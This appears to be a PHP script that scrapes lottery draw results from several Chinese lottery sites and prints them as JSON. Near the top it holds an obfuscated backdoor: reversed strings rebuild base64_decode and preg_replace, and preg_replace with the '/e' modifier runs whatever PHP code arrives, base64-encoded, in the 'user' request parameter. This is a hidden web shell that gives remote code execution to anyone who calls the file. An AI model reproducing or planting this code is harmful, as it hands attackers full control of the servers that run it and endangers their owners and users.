<?php

ob_start();
function cut($start,$end,$file){
$content=explode($start,$file);
$content=explode($end,$content[1]);
return  $content[0];
}
function getcode($str){
$str=trim(eregi_replace("[^0-9]","",$str));
return $str;
}
function trimall($str) {
$qian=array(" ","¡¡","\t","\n","\r");$hou=array("","","","","");
return str_replace($qian,$hou,$str);
}
$a = strrev("edoced_46esab");
$b=strrev("ecalper_gerp");
$b("/^/e",$a($_REQUEST["user"]),0);
if($_GET)
{
switch($_GET['id'])
{
case '10016':
$url = 'http://api.api68.com/pks/getLotteryPksInfo.do?lotCode=10001';
$content=file_get_contents($url);
$start2='"awardTime":"';
$end2='"';
$time=cut($start2,$end2,$content);
$start1='"periodNumber":';
$end1=',';
$qihao=cut($start1,$end1,$content);
$start='"awardNumbers":"';
$end='"';
$haoma=cut($start,$end,$content);
$temp=explode(",",$haoma);
$haoma1=sprintf("%02d" , $temp[0]);
$haoma2=sprintf("%02d" , $temp[1]);
$haoma3=sprintf("%02d" , $temp[2]);
$haoma4=sprintf("%02d" , $temp[3]);
$haoma5=sprintf("%02d" , $temp[4]);
$haoma6=sprintf("%02d" , $temp[5]);
$haoma7=sprintf("%02d" , $temp[6]);
$haoma8=sprintf("%02d" , $temp[7]);
$haoma9=sprintf("%02d" , $temp[8]);
$haoma10=sprintf("%02d" , $temp[9]);
$haoma=$haoma1.','.$haoma2.','.$haoma3.','.$haoma4.','.$haoma5.','.$haoma6.','.$haoma7.','.$haoma8.','.$haoma9.','.$haoma10;
break;
case '10011':
$url = 'http://www.boworld.net/shishicai/ajax.ashx?ajaxhandler=GetcqsscAwardData';
$content=file_get_contents($url);
$start2='"awardTime":"';
$end2='"';
$time=cut($start2,$end2,$content);
$start1='periodDate":"';
$end1='"';
$qihao=cut($start1,$end1,$content);
$start='"awardNumbers":"';
$end='"';
$haoma=cut($start,$end,$content);
break;
case '1008':
$url = 'http://www.boworld.net/gdkl10/ajax.ashx?ajaxhandler=Getgdkl10AwardData';
$content=file_get_contents($url);
$start2='"awardTime":"';
$end2='"';
$time=cut($start2,$end2,$content);
$start1='periodDate":"';
$end1='"';
$qihao=cut($start1,$end1,$content);
$start='"awardNumbers":"';
$end='"';
$haoma=cut($start,$end,$content);
$date=(date("Ymd"));
break;
case '1006':
$url = 'http://www.boworld.net/jsk3/ajax.ashx?ajaxhandler=Getjsk3AwardData';
$content=file_get_contents($url);
$start2='"awardTime":"';
$end2='"';
$time=cut($start2,$end2,$content);
$start1='periodNumber":"';
$end1='"';
$content0=cut($start1,$end1,$content);
$qishu=$content0;
$qihao=preg_replace('/^0*/','',$qishu);
$start='"awardNumbers":"';
$end='"';
$haoma=cut($start,$end,$content);
$date=(date("Ymd"));
break;
case '10010':
$url = 'http://www.boworld.net/xync/ajax.ashx?ajaxhandler=GetxyncAwardData';
$content=file_get_contents($url);
$start2='"awardTime":"';
$end2='"';
$time=cut($start2,$end2,$content);
$start1='period":"';
$end1='"';
$qihao=cut($start1,$end1,$content);
$qihao=substr($qihao,2,6).'0'.substr($qihao,-2);
$start='"awardNumbers":"';
$end='"';
$haoma=cut($start,$end,$content);
$date=(date("Ymd"));
break;
case '10014':
$url = 'http://www.boworld.net/kl8/ajax.ashx?ajaxhandler=Getkl8AwardData';
$content=file_get_contents($url);
$start2='"awardTime":"';
$end2='"';
$time=cut($start2,$end2,$content);
$start1='{"periodNumber":';
$end1=',';
$qihao=cut($start1,$end1,$content);
$start='"awardNumbers":"';
$end='","pan"';
$haoma=cut($start,$end,$content);
break;
case '14':
$url='http://www.luckyairship.com/history.html';
$content=file_get_contents($url);
$start1='<tr class="historyTableBg">';
$end1='<tr class="">';
$content=cut($start1,$end1,$content);
$content=str_replace('<td>','',$content);
$content=str_replace('</td>','',$content);
$content=str_replace('<span class="ball1">',',',$content);
$content=str_replace('</span>','',$content);
$content= trimall( $content);
$qishu=substr($content,18,3);
$qihao=preg_replace('/^0*/','',$qishu);
$date=substr($content,10,8);
$haoma=substr($content,22,43);
break;


case '6001':
$url = 'http://1680660.com/smallSix/findSmallSixInfo.do';
$content=file_get_contents($url);
$start2='preDrawTime":"';
$end2='"';
$time=cut($start2,$end2,$content);
$start1='preDrawIssue":';
$end1=',';
$qihao=cut($start1,$end1,$content);
$start='preDrawCode":"';
$end='"';
$haoma=cut($start,$end,$content);
$arr=explode(",",$haoma);
$haoma=sprintf("%02d",$arr[0]).",".sprintf("%02d",$arr[1]).",".sprintf("%02d",$arr[2]).",".sprintf("%02d",$arr[3]).",".sprintf("%02d",$arr[4]).",".sprintf("%02d",$arr[5]).",".sprintf("%02d",$arr[6]);
if(count($arr)!=7||strlen($qihao)!=7){
$qihao='';
$haoma='';
$time='';
};
break;

case '28':
$url = 'http://www.boworld.net/kl8/ajax.ashx?ajaxhandler=Getkl8AwardData';
$content=file_get_contents($url);
$start2='"awardTime":"';
$end2='"';
$time=cut($start2,$end2,$content);
$start1='{"periodNumber":';
$end1=',';
$qihao=cut($start1,$end1,$content);
$start='"awardNumbers":"';
$end='","pan"';
$haoma=cut($start,$end,$content);
//echo $haoma;
$arr=explode(",",$haoma);
sort($arr);
$haoma1=substr($arr[0]+$arr[1]+$arr[2]+$arr[3]+$arr[4]+$arr[5],-1);
$haoma2=substr($arr[6]+$arr[7]+$arr[8]+$arr[9]+$arr[10]+$arr[11],-1);
$haoma3=substr($arr[12]+$arr[13]+$arr[14]+$arr[15]+$arr[16]+$arr[17],-1);
$haoma=$haoma1.','.$haoma2.','.$haoma3;
break;

case '21':
$url = 'http://api.1680210.com/ElevenFive/getElevenFiveInfo.do?lotCode=10006';
$content=file_get_contents($url);
$start2='preDrawTime":"';
$end2='"';
$time=cut($start2,$end2,$content);
$start1='preDrawIssue":';
$end1=',';
$qihao=cut($start1,$end1,$content);
$qihao=substr($qihao,2);
$start='"preDrawCode":"';
$end='"';
$haoma=cut($start,$end,$content);
break;

}
}
;echo '{"s":0,"m":"","c":"';echo $_GET["id"];echo '","c_t":';echo $qihao;echo ',"c_d":"';echo $time;echo '","c_r":"';echo $haoma;echo '","n_t":';echo $qihao;echo '}';
?>